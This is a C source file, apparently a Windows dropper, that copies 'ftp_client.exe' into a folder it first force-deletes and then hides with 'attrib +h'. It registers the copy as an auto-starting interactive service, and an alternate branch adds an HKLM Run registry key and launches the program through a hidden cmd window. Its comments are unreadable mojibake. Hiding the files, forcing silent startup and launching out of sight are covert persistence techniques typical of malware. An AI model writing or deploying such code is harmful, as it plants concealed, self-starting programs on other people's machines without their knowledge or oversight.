#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <unistd.h>
#include <direct.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <io.h>

int copy_file();

int main(void)
{	
	copy_file();

#if 1//����������ʽ	
	
	//�򿪷�����ƹ��������ݿ�
	SC_HANDLE shOSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if(shOSCM == NULL)
	{
		return 0;
		//printf("111\n");
	}

	//��������
	SC_HANDLE shCS = CreateService(shOSCM,
						"ftp_client",//sc delete ftp_client 
						"ftp_client",//����������ʾ������,����
						SERVICE_ALL_ACCESS,
						SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS,
						SERVICE_AUTO_START,
						SERVICE_ERROR_NORMAL,
						"D:\\QQftp\\ftp_client.exe",
						NULL,NULL,NULL,NULL,NULL
						);
	if(shCS == NULL)
	{
		return 0;
		//printf("222\n");
	}
	
	//cmd����ԱȨ��ɾ������
	//sc delete ftp_client 
	
	//�򿪷���
	//shCS = OpenService(shOSCM, "ftp_client", SERVICE_ALL_ACCESS);
	//if(shCS == NULL)
	//{
	//	CloseServiceHandle(shOSCM);
	//	printf("333\n");
	//}
	//��ʼ����
	StartService(shCS, 0, NULL);
	//���Ʒ���
	//SERVICE_STATUS ss;
	//ControlService(shCS, SERVICE_CONTROL_STOP, &ss);
	//ɾ������
	//DeleteService(shCS);
	
	if(shOSCM)
	CloseServiceHandle(shOSCM);

	if(shCS)
	CloseServiceHandle(shCS);

#else//ע���������ʽ	
 
	char regname[]="Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run";
    HKEY hkResult;
	int ret=0;
	
    ret=RegOpenKey(HKEY_LOCAL_MACHINE,regname,&hkResult);//Ҫ�򿪼��ľ��,Ҫ���Ӽ������ֵĵ�ַ,Ҫ�򿪼��ľ���ĵ�ַ
	
    ret=RegSetValueEx(	hkResult,
						"run_ftp"/*ע������*/,
						0,
						REG_EXPAND_SZ,
						(unsigned char *)"D:\\QQFtp\\ftp_client.exe",/*��������·��*/
						23
						);
  
	if(ret==0)				
	{
		RegCloseKey(hkResult);
		//printf("ok\n");
	} 
	
	//ɾ������		
	//ret=RegDeleteValue(hkResult, "run_ftp");
	
	ShellExecute(0, "open", "cmd.exe", "/C D:\\QQFtp\\ftp_client.exe", NULL, SW_HIDE);
	
#endif	
	
    return 0;
}

int copy_file()
{
	FILE* fp1=NULL;
	FILE* fp2=NULL;
	struct stat file_info={0};
	int read_count=0;
	int all_size=0;
	char buf[1024+1]={0};	
	
	system("rd /q /s D:\\QQFtp");
	
	//�����ļ���
	mkdir("D:\\QQFtp");

	fp1=fopen("ftp_client.exe","rb");
	fp2=fopen("D:\\QQFtp\\ftp_client.exe","wb+");

	stat("ftp_client.exe",&file_info);	
	all_size = file_info.st_size;
	//printf("size:%d\n", all_size);
	
	while(all_size)
	{
		read_count=fread(buf, 1, 1024, fp1);
		fwrite(buf, read_count ,1 ,fp2);	
		all_size = all_size - read_count;
		memset(buf, 0, 1024+1);
	}
	fclose(fp1);
	fclose(fp2);

	//��������
	system("attrib +h D:\\QQFtp");
	
	return 0;
}


